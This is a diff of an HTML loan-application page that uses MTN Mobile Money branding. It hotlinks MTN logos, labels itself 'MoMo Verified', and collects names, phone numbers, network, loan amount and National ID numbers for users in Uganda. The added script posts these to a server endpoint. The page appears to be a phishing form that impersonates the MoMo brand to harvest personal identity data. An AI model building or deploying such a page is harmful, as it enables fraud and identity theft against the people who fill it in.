@@ -3,48 +3,44 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>MoMo App</title>
+<title>MoMo Loan</title>
 
 <style>
 body {
   margin: 0;
   font-family: Arial, sans-serif;
-  background: #0d5c73; /* Blue sides */
+  background: #0b5c6b; /* MoMo blue */
 }
 
 /* HEADER */
 .header {
-  background: #0d5c73;
+  background: #0b5c6b;
   color: #ffcc00;
-  text-align: center;
   padding: 15px;
+  text-align: center;
   font-size: 20px;
   font-weight: bold;
 }
 
 .header img {
-  width: 40px;
+  height: 35px;
   vertical-align: middle;
-  margin-right: 10px;
+  margin-right: 8px;
 }
 
-/* MAIN FORM AREA */
-.main {
-  background: #ffcc00;
-  min-height: 100vh;
-  padding: 20px;
-}
-
+/* FORM CARD */
 .container {
+  max-width: 400px;
+  margin: 30px auto;
   background: white;
   padding: 20px;
   border-radius: 15px;
-  max-width: 400px;
-  margin: auto;
 }
 
+/* TITLE */
 h2 {
   text-align: center;
+  margin-bottom: 20px;
 }
 
 /* INPUTS */
@@ -52,34 +48,29 @@ input, select {
   width: 100%;
   padding: 14px;
   margin: 10px 0;
-  border-radius: 8px;
+  border-radius: 10px;
   border: none;
-  background: #f2f2f2;
+  background: #f1f1f1;
   font-size: 14px;
 }
 
 /* BUTTON */
 button {
   width: 100%;
-  padding: 14px;
+  padding: 15px;
   background: #ffcc00;
   border: none;
-  border-radius: 8px;
+  border-radius: 10px;
   font-size: 16px;
   font-weight: bold;
-  cursor: pointer;
-}
-
-button:active {
-  background: #e6b800;
 }
 
 /* FOOTER */
 .footer {
   text-align: center;
-  font-size: 12px;
   color: white;
-  padding: 15px;
+  font-size: 12px;
+  margin: 20px 0;
 }
 </style>
 </head>
@@ -88,42 +79,63 @@ button:active {
 
 <!-- HEADER -->
 <div class="header">
-  <img src="https://upload.wikimedia.org/wikipedia/commons/7/7e/MTN_Mobile_Money_logo.svg">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/MTN_Logo.svg">
   MoMo App
 </div>
 
-<!-- MAIN -->
-<div class="main">
+<!-- FORM -->
+<div class="container">
+  <h2>Loan Application</h2>
 
-  <div class="container">
-    <h2>Loan Application</h2>
+  <form id="loanForm">
+    <input type="text" name="name" placeholder="Full Name" required>
+    <input type="text" name="phone" placeholder="Phone Number (07XXXXXXXX)" required>
 
-    <form action="/apply" method="POST">
-      <input type="text" name="name" placeholder="Full Name" required>
+    <select name="network" required>
+      <option value="">Select Network</option>
+      <option value="MTN">MTN</option>
+      <option value="Airtel">Airtel</option>
+    </select>
 
-      <input type="text" name="phone" placeholder="Phone Number (07XXXXXXXX)" required>
+    <input type="number" name="amount" placeholder="Loan Amount (UGX)" required>
+    <input type="text" name="nationalId" placeholder="National ID Number" required>
 
-      <select name="network" required>
-        <option value="">Select Network</option>
-        <option value="MTN">MTN</option>
-        <option value="Airtel">Airtel</option>
-      </select>
-
-      <input type="number" name="amount" placeholder="Loan Amount (UGX)" required>
-
-      <input type="text" name="nationalId" placeholder="National ID Number" required>
-
-      <button type="submit">Apply Now</button>
-    </form>
-
-  </div>
-
+    <button type="submit">Apply Now</button>
+  </form>
 </div>
 
 <!-- FOOTER -->
 <div class="footer">
-  2026 @ MoMo Verified
+  2026@MoMo Verified
 </div>
+
+<!-- SCRIPT -->
+<script>
+document.getElementById("loanForm").addEventListener("submit", async function(e) {
+  e.preventDefault();
+
+  const formData = new FormData(this);
+  const data = Object.fromEntries(formData.entries());
+
+  try {
+    const res = await fetch("/apply", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(data)
+    });
+
+    if (res.ok) {
+      window.location.href = "/success.html";
+    } else {
+      alert("❌ Error submitting application");
+    }
+  } catch (err) {
+    alert("❌ Server error");
+  }
+});
+</script>
 
 </body>
 </html>
